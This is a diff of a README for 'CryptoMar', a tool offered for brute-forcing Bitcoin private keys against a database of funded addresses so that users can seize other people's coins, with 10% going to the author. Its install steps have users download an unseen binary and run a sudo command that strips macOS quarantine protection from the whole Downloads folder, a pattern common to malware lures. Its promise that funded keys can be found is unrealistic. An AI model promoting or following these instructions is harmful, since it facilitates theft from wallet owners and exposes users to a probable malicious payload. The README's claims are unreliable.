@@ -2,7 +2,6 @@
 
 CryptoMar is a high-performance Bitcoin wallet brute-force tool based on a custom C++ library, optimized for macOS and Windows. The program supports the generation and search of private keys and Bech32 (P2WPKH) Bitcoin addresses at high speed, featuring a user-friendly interface aimed at regular users.
 
----
 ```bash
  _____________________________________________________________________
 |============================ Welcome to =============================|
@@ -25,7 +24,6 @@ CryptoMar is a high-performance Bitcoin wallet brute-force tool based on a custo
 |                                                                     |
 | 788681.99 addresses/s            Total: 5667243744                  |
 ```
----
 
 ## 🚀 Features
 
@@ -34,7 +32,6 @@ CryptoMar is a high-performance Bitcoin wallet brute-force tool based on a custo
 * Multi-threaded generation and verification with minimal memory usage.
 * An up-to-date database of all existing P2WPKH addresses with balances, current as of early May 2025.
 
----
 
 ## 🔓 How It Works
 
@@ -50,31 +47,28 @@ CryptoMar is a high-performance Bitcoin wallet brute-force tool based on a custo
 * Each address is checked for a balance in a database of known addresses with confirmed balances.
 * If an address with a balance is found, the private key is saved and the user is notified.
 
----
 
 ## 🌐 How Many Wallets with Balances?
 
 As of early May 2025, the program's database contains **6,514,125 Bech32 (P2WPKH) addresses** with confirmed balances.
 
----
 
 ## ❓ Why Is the Author Sharing This Program?
 
 Brute-forcing private keys is a matter of substantial time and computational power. The author created this software to distribute the process among a large number of people. The user who finds the correct key receives 90% of the funds, while the author receives 10%.
 
----
 
 ## 📥 Download and Launch
 
 ### 🪟 For Windows
 
 1. Open the latest release: [CryptoMar Releases](https://github.com/HexaMar/CryptoMar_EN/releases/tag/v1.0.0)
-2. Download the file `CryptoMarFreeInstaller.exe` (free version) or `CryptoMarFullInstaller.exe` (paid version).
+2. Download the file `CryptoMarInstaller.exe`
 3. Follow the installer instructions.
 
 ### 🍎 For macOS
 
-1. Download the file `cryptomar_free.bin` or `cryptomar_full.bin`.
+1. Download the file `cryptomar.bin`
 
 2. Download the file `P2WPKH.nonzero.txt` (database of addresses with balances).
 
@@ -90,23 +84,14 @@ Brute-forcing private keys is a matter of substantial time and computational pow
 
    ```bash
    sudo xattr -rd com.apple.quarantine ~/Downloads/*
-   chmod +x ./cryptomar_free.bin
-   chmod +x ./cryptomar_full.bin
+   chmod +x ./cryptomar.bin
    ```
 
 5. Launch the program:
 
    ```bash
-   ./cryptomar_free.bin
+   ./cryptomar.bin
    ```
-
-   or
-
-   ```bash
-   ./cryptomar_full.bin
-   ```
-
----
 
 ## ⚡ Paid and Free Versions
 
@@ -115,7 +100,6 @@ Brute-forcing private keys is a matter of substantial time and computational pow
 
 If the program exits without finding the file, ensure all required files are in the same folder.
 
----
 
 ## 💡 Support
 
